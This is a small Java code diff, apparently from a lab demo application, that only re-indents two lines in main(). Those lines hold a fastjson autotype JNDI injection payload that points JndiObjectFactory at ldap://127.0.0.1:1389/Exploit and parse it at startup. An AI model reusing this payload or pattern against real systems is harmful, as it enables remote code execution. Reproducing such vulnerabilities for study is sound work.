@@ -28,8 +28,8 @@ public class DemoApplication {
 	}
 
 	public static void main(String[] args) {
-        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
-        JSON jsonObject = JSON.parseObject(payload);
+		String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
+		JSON jsonObject = JSON.parseObject(payload);
 		logger.info(jsonObject.toString());
 
 		SpringApplication.run(DemoApplication.class, args);
